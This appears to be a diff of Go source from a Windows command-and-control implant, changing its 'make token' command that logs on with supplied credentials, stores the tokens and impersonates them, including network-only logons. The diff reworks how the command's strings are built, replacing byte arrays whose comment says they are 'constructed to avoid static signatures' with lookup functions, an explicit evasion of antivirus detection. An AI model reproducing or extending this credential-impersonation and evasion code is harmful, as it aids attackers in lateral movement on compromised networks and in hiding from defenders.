@@ -13,24 +13,111 @@ import (
 	"unsafe"
 )
 
-// Make token strings (constructed to avoid static signatures)
-var (
-	mtBackslash       = string([]byte{0x5c})                                                                                     // \
-	mtAtSign          = string([]byte{0x40})                                                                                     // @
-	mtDot             = string([]byte{0x2e})                                                                                     // .
-	mtNetwork         = string([]byte{0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b})                                                 // network
-	mtBatch           = string([]byte{0x62, 0x61, 0x74, 0x63, 0x68})                                                             // batch
-	mtService         = string([]byte{0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                 // service
-	mtNetCleartext    = string([]byte{0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x5f, 0x63, 0x6c, 0x65, 0x61, 0x72, 0x74, 0x65, 0x78, 0x74}) // network_cleartext
-	mtNetClear        = string([]byte{0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x5f, 0x63, 0x6c, 0x65, 0x61, 0x72})             // network_clear
-	mtNewCredentials  = string([]byte{0x6e, 0x65, 0x77, 0x5f, 0x63, 0x72, 0x65, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x61, 0x6c, 0x73}) // new_credentials
-	mtNewCreds        = string([]byte{0x6e, 0x65, 0x77, 0x63, 0x72, 0x65, 0x64, 0x73})                                           // newcreds
-	mtInteractive     = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x72, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                         // interactive
-	mtSourceCreated   = string([]byte{0x63})                                                                                     // c (source for created tokens)
-	mtSourceCompare   = string([]byte{0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64})                                                 // created
-	mtTokenTypePrimary = string([]byte{0x70, 0x72, 0x69, 0x6d, 0x61, 0x72, 0x79})                                                // primary
-	mtUnknown         = string([]byte{0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e})                                                 // Unknown
-)
+// Make token convenience functions using shared tokTpl() from action_token_windows.go
+func mtBackslash() string {
+	if s := tokTpl(idxTokBackslash); s != "" {
+		return s
+	}
+	return "\\"
+}
+
+func mtAtSign() string {
+	if s := tokTpl(idxTokAtSign); s != "" {
+		return s
+	}
+	return "@"
+}
+
+func mtDot() string {
+	if s := tokTpl(idxTokDot); s != "" {
+		return s
+	}
+	return "."
+}
+
+func mtNetwork() string {
+	if s := tokTpl(idxTokLogonNetwork); s != "" {
+		return s
+	}
+	return "network"
+}
+
+func mtBatch() string {
+	if s := tokTpl(idxTokLogonBatch); s != "" {
+		return s
+	}
+	return "batch"
+}
+
+func mtService() string {
+	if s := tokTpl(idxTokLogonService); s != "" {
+		return s
+	}
+	return "service"
+}
+
+func mtNetCleartext() string {
+	if s := tokTpl(idxTokLogonNetCleartext); s != "" {
+		return s
+	}
+	return "network_cleartext"
+}
+
+func mtNetClear() string {
+	if s := tokTpl(idxTokLogonNetClear); s != "" {
+		return s
+	}
+	return "network_clear"
+}
+
+func mtNewCredentials() string {
+	if s := tokTpl(idxTokLogonNewCreds); s != "" {
+		return s
+	}
+	return "new_credentials"
+}
+
+func mtNewCreds() string {
+	if s := tokTpl(idxTokLogonNewCredsAlt); s != "" {
+		return s
+	}
+	return "newcreds"
+}
+
+func mtInteractive() string {
+	if s := tokTpl(idxTokLogonInteractive); s != "" {
+		return s
+	}
+	return "interactive"
+}
+
+func mtSourceCreated() string {
+	if s := tokTpl(idxTokSourceCreated); s != "" {
+		return s
+	}
+	return "c"
+}
+
+func mtSourceCompare() string {
+	if s := tokTpl(idxTokCreatedCmp); s != "" {
+		return s
+	}
+	return "created"
+}
+
+func mtTokenTypePrimary() string {
+	if s := tokTpl(idxTokTypePrimary); s != "" {
+		return s
+	}
+	return "primary"
+}
+
+func mtUnknown() string {
+	if s := tokTpl(idxTokUnknown); s != "" {
+		return s
+	}
+	return "Unknown"
+}
 
 // MakeTokenCommand handles Windows token creation with credentials (kept for delegation from TokenCommand)
 type MakeTokenCommand struct{}
@@ -38,34 +125,34 @@ type MakeTokenCommand struct{}
 func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, password string, tokenName string, logonTypeStr string) CommandResult {
 	// Parse domain\user or just user
 	var domain, user string
-	if strings.Contains(userStr, mtBackslash) {
-		parts := strings.SplitN(userStr, mtBackslash, 2)
+	if strings.Contains(userStr, mtBackslash()) {
+		parts := strings.SplitN(userStr, mtBackslash(), 2)
 		domain = parts[0]
 		user = parts[1]
-	} else if strings.Contains(userStr, mtAtSign) {
+	} else if strings.Contains(userStr, mtAtSign()) {
 		// UPN format
 		user = userStr
 		domain = ""
 	} else {
 		// Local user
 		user = userStr
-		domain = mtDot
+		domain = mtDot()
 	}
 
 	// Map logon type string to constant
 	logonType := LOGON32_LOGON_INTERACTIVE
 	switch strings.ToLower(logonTypeStr) {
-	case mtNetwork:
+	case mtNetwork():
 		logonType = LOGON32_LOGON_NETWORK
-	case mtBatch:
+	case mtBatch():
 		logonType = LOGON32_LOGON_BATCH
-	case mtService:
+	case mtService():
 		logonType = LOGON32_LOGON_SERVICE
-	case mtNetCleartext, mtNetClear:
+	case mtNetCleartext(), mtNetClear():
 		logonType = LOGON32_LOGON_NETWORK_CLEARTEXT
-	case mtNewCredentials, mtNewCreds:
+	case mtNewCredentials(), mtNewCreds():
 		logonType = LOGON32_LOGON_NEW_CREDENTIALS
-	case mtInteractive:
+	case mtInteractive():
 		logonType = LOGON32_LOGON_INTERACTIVE
 	default:
 		logonType = LOGON32_LOGON_INTERACTIVE
@@ -139,10 +226,10 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 	globalTokenStore.Metadata[tokenName] = TokenMetadata{
 		User:      user,
 		Domain:    domain,
-		Source:    mtSourceCreated,
+		Source:    mtSourceCreated(),
 		LogonType: logonTypeStr,
 		StoredAt:  time.Now(),
-		TokenType: mtTokenTypePrimary,
+		TokenType: mtTokenTypePrimary(),
 		NetOnly:   false,
 	}
 
@@ -165,13 +252,13 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr string, password string, tokenName string) CommandResult {
 	// Parse domain\user
 	var domain, user string
-	if strings.Contains(userStr, mtBackslash) {
-		parts := strings.SplitN(userStr, mtBackslash, 2)
+	if strings.Contains(userStr, mtBackslash()) {
+		parts := strings.SplitN(userStr, mtBackslash(), 2)
 		domain = parts[0]
 		user = parts[1]
 	} else {
 		user = userStr
-		domain = mtDot
+		domain = mtDot()
 	}
 
 
@@ -240,10 +327,10 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 	globalTokenStore.Metadata[tokenName] = TokenMetadata{
 		User:      user,
 		Domain:    domain,
-		Source:    mtSourceCreated,
-		LogonType: mtNewCredentials,
+		Source:    mtSourceCreated(),
+		LogonType: mtNewCredentials(),
 		StoredAt:  time.Now(),
-		TokenType: mtTokenTypePrimary,
+		TokenType: mtTokenTypePrimary(),
 		NetOnly:   true, // Mark as network-only
 	}
 
@@ -278,7 +365,7 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	var foundName string
 
 	for name, metadata := range globalTokenStore.Metadata {
-		if metadata.Source == mtSourceCompare && !metadata.NetOnly {
+		if metadata.Source == mtSourceCompare() && !metadata.NetOnly {
 			if token, exists := globalTokenStore.Tokens[name]; exists {
 				foundToken = token
 				foundName = name
@@ -357,7 +444,7 @@ func (c *MakeTokenCommand) clearTokens(ctx *CommandContext) CommandResult {
 	var clearedCount int
 
 	for name, metadata := range globalTokenStore.Metadata {
-		if metadata.Source == mtSourceCompare {
+		if metadata.Source == mtSourceCompare() {
 			// Check if this is the active network-only token
 			if globalTokenStore.NetOnlyToken == name {
 				globalTokenStore.NetOnlyToken = ""
@@ -400,11 +487,11 @@ func (c *MakeTokenCommand) getCurrentUserInfo() (string, string) {
 	token, err := syscall.OpenCurrentProcessToken()
 	if err == nil {
 		defer token.Close()
-		if user, domain := c.getTokenUserInfo(syscall.Handle(token)); user != mtUnknown {
+		if user, domain := c.getTokenUserInfo(syscall.Handle(token)); user != mtUnknown() {
 			return user, domain
 		}
 	}
-	return mtUnknown, mtUnknown
+	return mtUnknown(), mtUnknown()
 }
 
 func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
@@ -418,7 +505,7 @@ func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, strin
 	)
 
 	if needed == 0 {
-		return mtUnknown, ""
+		return mtUnknown(), ""
 	}
 
 	buffer := make([]byte, needed)
@@ -431,7 +518,7 @@ func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, strin
 	)
 
 	if ret == 0 {
-		return mtUnknown, ""
+		return mtUnknown(), ""
 	}
 
 	tokenUser := (*TokenUser)(unsafe.Pointer(&buffer[0]))
@@ -452,7 +539,7 @@ func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, strin
 	)
 
 	if ret == 0 {
-		return mtUnknown, ""
+		return mtUnknown(), ""
 	}
 
 	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(domainBuffer)
